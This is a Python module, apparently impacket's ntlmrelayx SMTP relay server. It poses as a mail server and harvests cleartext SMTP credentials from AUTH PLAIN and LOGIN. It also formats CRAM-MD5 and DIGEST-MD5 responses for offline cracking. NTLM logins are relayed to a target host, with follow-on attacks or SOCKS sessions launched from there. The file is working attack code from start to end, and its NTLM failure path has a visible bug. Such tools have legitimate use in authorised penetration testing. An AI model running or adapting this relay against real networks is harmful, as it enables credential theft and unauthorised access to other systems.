from threading import Thread
import socketserver

from impacket import LOG, ntlm
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.utils import get_address
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.ssl import generate_self_signed_certificate, sni_callback
from OpenSSL import SSL, crypto
import socket
import re
import base64
import hashlib
import time
from typing import List


class SMTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, config: NTLMRelayxConfig):
        self.config = config
        self.self_signed_certificate = False
        if self.config.smtp_server_cert and self.config.smtp_server_key:
            try:
                self.server_cert = crypto.load_certificate(crypto.FILETYPE_PEM, self.config.smtp_server_cert)
                self.server_key = crypto.load_privatekey(crypto.FILETYPE_PEM, self.config.smtp_server_key)
            except Exception as e:
                LOG.error(f"(SMTP): Unable to load cert chain from files: {e}")
                exit(1)
        else:
            LOG.warning("(SMTP) Generating self-signed certificate")
            server_cert, server_key = generate_self_signed_certificate()
            self.server_cert = crypto.load_certificate(crypto.FILETYPE_PEM, server_cert)
            self.server_key = crypto.load_privatekey(crypto.FILETYPE_PEM, server_key)
            self.self_signed_certificate = True
        self.daemon_threads = True
        self.address_family, self.server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
        socketserver.TCPServer.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

class SMTPHandler(socketserver.BaseRequestHandler):
    def __init__(self, request: socket.socket, client_address, server):
        self.server = server
        self.challengeMessage = None
        self.client = None
        self.machineAccount = None
        self.machineHashes = None
        self.domainIp = None
        self.authUser = None
        
        if self.server.config.target is None:
            # Reflection mode, defaults to SMB at the target, for now
            self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
        self.target = self.server.config.target.getTarget()
        if self.target is None:
            LOG.info("(SMTP): Received connection from %s, but there are no more targets left!" % client_address[0])
            return

        LOG.info("(SMTP): Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))

        super().__init__(request, client_address, server)
    
    def send_response(self, code: int, message: str) -> None:
        """Send SMTP response"""
        response = "%d %s\r\n" % (code, message)
        self.request.send(response.encode('latin-1'))
    
    def send_multiline_response(self, code: str, lines: List[str]) -> None:
        """Send multi-line SMTP response"""
        for i, line in enumerate(lines):
            if i < len(lines) - 1:
                response = "%d-%s\r\n" % (code, line)
            else:
                response = "%d %s\r\n" % (code, line)
            self.request.send(response.encode('latin-1'))
    
    def send_continue(self, data: str=""):
        """Send continuation response for AUTH"""
        if data:
            response = "334 %s\r\n" % data
        else:
            response = "334\r\n"
        self.request.send(response.encode('latin-1'))
    
    def upgrade_to_tls(self):
        """Upgrade connection to TLS using Responder's SSL certificates"""
        try:               
            # Create SSL context
            context = SSL.Context(SSL.SSLv23_METHOD)
            context.set_options(SSL.OP_NO_SSLv2 | SSL.OP_NO_SSLv3)
            context.use_certificate(self.server.server_cert)
            context.use_privatekey(self.server.server_key)
            if self.self_signed_certificate:
                context.sni_callback = sni_callback
            connection = SSL.Connection(context, self.request)
            connection.set_accept_state()
            connection.do_handshake()
            
            # Wrap socket
            self.request = connection

            LOG.info(f"(SMTP): Successfully upgraded to TLS from {self.client_address[0]}")
            return True
            
        except Exception as e:
            LOG.error(f"(SMTP): TLS upgrade failed: {e}")
            return False
    
    def handle_auth_plain(self, data):
        """Handle AUTH PLAIN"""
        try:
            # AUTH PLAIN can be:
            # AUTH PLAIN <base64>
            # or
            # AUTH PLAIN
            # <base64>
            
            auth_match = re.search(b'AUTH PLAIN (.+)', data, re.IGNORECASE)
            
            if auth_match:
                # Inline format
                auth_data = auth_match.group(1).strip()
            else:
                # Need to read next line
                self.send_continue()
                auth_data = self.request.recv(1024).strip()
            
            if not auth_data or auth_data == b'*':
                return False
            
            # Decode
            decoded = base64.b64decode(auth_data)
            # Format: [authzid]\x00username\x00password
            parts = decoded.split(b'\x00')
            
            if len(parts) >= 3:
                username = parts[1].decode('latin-1', errors='ignore')
                password = parts[2].decode('latin-1', errors='ignore')
            elif len(parts) == 2:
                username = parts[0].decode('latin-1', errors='ignore')
                password = parts[1].decode('latin-1', errors='ignore')
            else:
                return False
            
            LOG.info(f"(SMTP) gained plain auth message from {self.client_address[0]}, received credentials: {username} : {password}")
            return True
        except Exception as e:
            LOG.error(f"Error parsing AUTH PLAIN message: {e}. String: {data}")
            return False
    
    def handle_auth_login(self, data):
        """Handle AUTH LOGIN (two-stage)"""
        username = None
        password = None
        try:
            # Check if username is inline
            auth_match = re.search(b'AUTH LOGIN (.+)', data, re.IGNORECASE)
            
            if auth_match:
                # Username provided inline
                username_b64 = auth_match.group(1).strip()
                username = base64.b64decode(username_b64).decode('latin-1', errors='ignore')
            else:
                # Prompt for username
                self.send_continue(base64.b64encode(b"Username:").decode('latin-1'))
                username_b64 = self.request.recv(1024).strip()
                
                if not username_b64 or username_b64 == b'*':
                    return False
                
                username = base64.b64decode(username_b64).decode('latin-1', errors='ignore')
            
            # Prompt for password
            self.send_continue(base64.b64encode(b"Password:").decode('latin-1'))
            password_b64 = self.request.recv(1024).strip()
            
            if not password_b64 or password_b64 == b'*':
                return False
            
            password = base64.b64decode(password_b64).decode('latin-1', errors='ignore')

            LOG.info(f"(SMTP): Captured AUTH LOGIN credentials from {self.client_address[0]}. {username} : {password}")
            return True
        except Exception as e:
            LOG.error(f"Exception when AUTH LOGIN message: {e}. Login: {username}, Password: {password}")
            return False
    
    def handle_auth_cram_md5(self, data):
        """Handle AUTH CRAM-MD5 (challenge-response)"""
        try:
            import time
            import os
            
            # Generate challenge
            challenge = "<%d.%d@%s>" % (os.getpid(), int(time.time()), "IMPACKETMACHINE")
            challenge_b64 = base64.b64encode(challenge.encode('latin-1')).decode('latin-1')
            
            # Send challenge
            self.send_continue(challenge_b64)
            
            # Receive response
            response_b64 = self.request.recv(1024).strip()
            
            if not response_b64 or response_b64 == b'*':
                return False
            
            response = base64.b64decode(response_b64).decode('latin-1', errors='ignore')
            # Format: username<space>digest
            parts = response.split(' ', 1)
            
            if len(parts) < 2:
                return False
            
            username = parts[0]
            digest = parts[1].lower()
            
            # Format for hashcat
            hash_string = "%s:$cram_md5$%s$%s" % (username, challenge, digest)
            
            LOG.info(f"(SMTP): Captured CRAM-MD5 hash from {self.client_address[0]}: {hash_string}")
            
            return True
        except Exception as e:
            LOG.error(f"(SMTP): Error parsing CRAM-MD5: {e}")
            return False
    
    def handle_auth_digest_md5(self, data):
        """Handle AUTH DIGEST-MD5"""
        try:
            # Generate nonce
            nonce = hashlib.md5(str(time.time()).encode()).hexdigest()
            
            # Build challenge
            challenge_parts = [
                'realm="%s"' % "IMPACKETMACHINE",
                'nonce="%s"' % nonce,
                'qop="auth"',
                'charset=utf-8',
                'algorithm=md5-sess'
            ]
            challenge = ','.join(challenge_parts)
            challenge_b64 = base64.b64encode(challenge.encode('latin-1')).decode('latin-1')
            
            # Send challenge
            self.send_continue(challenge_b64)
            
            # Receive response
            response_b64 = self.request.recv(1024).strip()
            
            if not response_b64 or response_b64 == b'*':
                return False
            
            response = base64.b64decode(response_b64).decode('latin-1', errors='ignore')
            
            # Parse response
            username_match = re.search(r'username="([^"]+)"', response)
            realm_match = re.search(r'realm="([^"]+)"', response)
            nonce_match = re.search(r'nonce="([^"]+)"', response)
            cnonce_match = re.search(r'cnonce="([^"]+)"', response)
            nc_match = re.search(r'nc=([0-9a-fA-F]+)', response)
            qop_match = re.search(r'qop=([a-z\-]+)', response)
            uri_match = re.search(r'digest-uri="([^"]+)"', response)
            response_match = re.search(r'response=([0-9a-fA-F]+)', response)
            
            if not username_match or not response_match:
                return False
            
            username = username_match.group(1)
            realm = realm_match.group(1) if realm_match else ''
            resp_nonce = nonce_match.group(1) if nonce_match else ''
            cnonce = cnonce_match.group(1) if cnonce_match else ''
            nc = nc_match.group(1) if nc_match else ''
            qop = qop_match.group(1) if qop_match else ''
            uri = uri_match.group(1) if uri_match else ''
            resp_hash = response_match.group(1)
            
            # Format for hashcat/john
            hash_string = "%s:$sasl$DIGEST-MD5$%s$%s$%s$%s$%s$%s$%s" % (
                username, realm, nonce, cnonce, nc, qop, uri, resp_hash
            )
            LOG.info(f"(SMTP) Captured Digest-MD5 hash from {self.client_address[0]} for user {username}: {hash_string}")
            
            # Send rspauth (expected by some clients)
            rspauth = 'rspauth=' + resp_hash
            self.send_continue(base64.b64encode(rspauth.encode('latin-1')).decode('latin-1'))
            
            # Client should send empty line
            self.request.recv(1024)
            
            return True
        except Exception as e:
            LOG.error('(SMTP) Error parsing DIGEST-MD5: %s' % str(e))
            return False
    
    def handle_auth_ntlm(self, data):
        """Handle AUTH NTLM with proper Type 2 challenge"""
        try:
            # Check for inline NTLM NEGOTIATE
            auth_match = re.search(b'AUTH NTLM (.+)', data, re.IGNORECASE)
            
            if auth_match:
                negotiate_b64 = auth_match.group(1).strip()
            else:
                # Send empty continuation
                self.send_continue()
                negotiate_b64 = self.request.recv(1024).strip()
            
            if not negotiate_b64 or negotiate_b64 == b'*':
                return False
            
            negotiate = base64.b64decode(negotiate_b64)
            
            # Verify NTLMSSP signature
            if negotiate[0:8] != b'NTLMSSP\x00':
                return False
            
            # Relay challenge
            challenge = self.do_ntlm_negotiate(negotiate)
            if challenge is None:
                LOG.error(f"(SMTP) Error when relay NTLM Type 2 message to client ")
                return False
            
            challenge_b64 = base64.b64encode(challenge.getData()).decode('latin-1')
            
            # Send challenge
            self.send_continue(challenge_b64)
            
            # Receive NTLMSSP AUTH (Type 3) from client
            auth_b64 = self.request.recv(2048).strip()
            
            if not auth_b64 or auth_b64 == b'*':
                return False
            
            auth_data = base64.b64decode(auth_b64)

            # Relay Type 3 packet to client
            authenticateMessage = self.do_ntlm_auth(auth_data)
            if authenticateMessage is None:
                # Authentication failed
                self.send_response(503, "Authentication failed")
                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                    LOG.error("(SMTP): Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('utf-16le'),
                        authenticateMessage['user_name'].decode('utf-16le')))
                else:
                    LOG.error("(SMTP): Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('ascii'),
                        authenticateMessage['user_name'].decode('ascii')))
                return False
            # relay worked, do whatever we want
            self.send_response(503, "Authentication successful relayed by Impacket")
            self.client.setClientId()
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                LOG.info("(SMTP): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                    authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'),
                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
            else:
                LOG.info("(SMTP): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                    authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'),
                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
            
            ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'],
                                                authenticateMessage['lanman'], authenticateMessage['ntlm'])
            self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

            if self.server.config.dumpHashes is True:
                LOG.info("(SMTP): %s" % ntlm_hash_data['hash_string'])

            if self.server.config.outputFile is not None:
                writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                        self.server.config.outputFile)

            self.server.config.target.registerTarget(self.target, True, self.authUser)

            self.do_attack()
            return True
            
        except Exception as e:
            LOG.error('[SMTP] Error parsing NTLM: %s' % str(e))
            return False
    
    def do_ntlm_negotiate(self, token: bytes) -> bytes | None:
        self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
        # If connection failed -> return False
        if not self.client.initConnection():
            return None
        self.challengeMessage = self.client.sendNegotiate(token)
        if self.server.config.remove_target:
            av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
            del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
            self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
            self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
            self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
        
        if self.challengeMessage is False:
            return None
        return self.challengeMessage
    
    def do_ntlm_auth(self, token: bytes) -> bytes | None:
        self.authenticateMessage = ntlm.NTLMAuthChallengeResponse()
        self.authenticateMessage.fromString(token)
        self.authUser = self.authenticateMessage.getUserString()
        if self.authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
            clientResponse, errorCode = self.client.sendAuth(token)
        else:
            # Anonymous login send STATUS_ACCESS_DENIED so we force the client to send his credentials, except when coming from localhost
            errorCode = STATUS_ACCESS_DENIED
        if errorCode == STATUS_SUCCESS:
            return self.authenticateMessage
        return None
    
    def do_attack(self):
        # Check if SOCKS is enabled and if we support the target scheme
        if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
            # Pass all the data to the socksplugins proxy
            activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                    self.authUser, self.client, self.client.sessionData))
            return

        # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        if self.target.scheme.upper() in self.server.config.attacks:
            # We have an attack.. go for it
            clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
                                                                            self.authUser, self.target, self.client)
            clientThread.start()
        else:
            LOG.error('(SMTP): No attack configured for %s' % self.target.scheme.upper())
    
    def handle(self):
        # try:
        # Send greeting
        self.request.send(b"220\x20IMPACKETSMTP ESMTP\x0d\x0a")
        data = self.request.recv(1024)
        
        # Handle EHLO
        if data[0:4].upper() == b'EHLO' or data[0:4].upper() == b'HELO':
            # Send ESMTP capabilities
            capabilities = [
                "IMPACKETMACHINE Hello",
                "STARTTLS",
                "AUTH PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM",
                "SIZE 35651584",
                "8BITMIME",
                "PIPELINING",
                "ENHANCEDSTATUSCODES"
            ]
            self.send_multiline_response(250, capabilities)
            data = self.request.recv(1024)
        
        # Handle STARTTLS command
        if data[0:8].upper() == b'STARTTLS':
            self.send_response(220, "Ready to start TLS")
            
            # Upgrade to TLS
            if self.upgrade_to_tls():
                # After successful TLS upgrade, client will send EHLO again
                data = self.request.recv(1024)
                
                # Handle EHLO after STARTTLS
                if data[0:4].upper() == b'EHLO' or data[0:4].upper() == b'HELO':
                    # Send capabilities again (without STARTTLS this time)
                    capabilities = [
                        "IMPACKETMACHINE Hello",
                        "AUTH PLAIN LOGIN CRAM-MD5 DIGEST-MD5 NTLM",
                        "SIZE 35651584",
                        "8BITMIME",
                        "PIPELINING",
                        "ENHANCEDSTATUSCODES"
                    ]
                    self.send_multiline_response(250, capabilities)
                    data = self.request.recv(1024)
            else:
                # TLS upgrade failed
                try:
                    self.send_response(454, "TLS not available")
                except:
                    pass
                return
        
        # Handle AUTH command
        if data[0:4].upper() == b'AUTH':
            mechanism = data[5:].strip().split(b' ')[0].upper()
            
            if mechanism == b'PLAIN':
                if self.handle_auth_plain(data):
                    self.send_response(235, "Authentication successful")
                else:
                    self.send_response(535, "Authentication failed")
                return
            
            elif mechanism == b'LOGIN':
                if self.handle_auth_login(data):
                    self.send_response(235, "Authentication successful")
                else:
                    self.send_response(535, "Authentication failed")
                return
            
            elif mechanism == b'CRAM-MD5' or mechanism.startswith(b'CRAM'):
                if self.handle_auth_cram_md5(data):
                    self.send_response(235, "Authentication successful")
                else:
                    self.send_response(535, "Authentication failed")
                return
            
            elif mechanism == b'DIGEST-MD5' or mechanism.startswith(b'DIGEST'):
                if self.handle_auth_digest_md5(data):
                    self.send_response(235, "Authentication successful")
                else:
                    self.send_response(535, "Authentication failed")
                return
            
            elif mechanism == b'NTLM':
                if self.handle_auth_ntlm(data):
                    self.send_response(235, "Authentication successful")
                else:
                    self.send_response(535, "Authentication failed")
                return
            
            else:
                self.send_response(504, "Unrecognized authentication type")
                return
        
        if data.upper().startswith(b"MAIL FROM"):
            self.send_response(530, "5.7.0 Authentication required")
            return
        
        # Handle other commands
        self.send_response(250, "OK")


class SMTPRelayServer(Thread):    
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):

        if self.config.listeningPort:
            smtpport = self.config.listeningPort
        else:
            smtpport = 25
            
        LOG.info("Setting up SMTP Server on port " + str(smtpport))            

        # changed to read from the interfaceIP set in the configuration
        self.server = SMTPServer((self.config.interfaceIp, smtpport), SMTPHandler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down SMTP Server')
        self.server.server_close()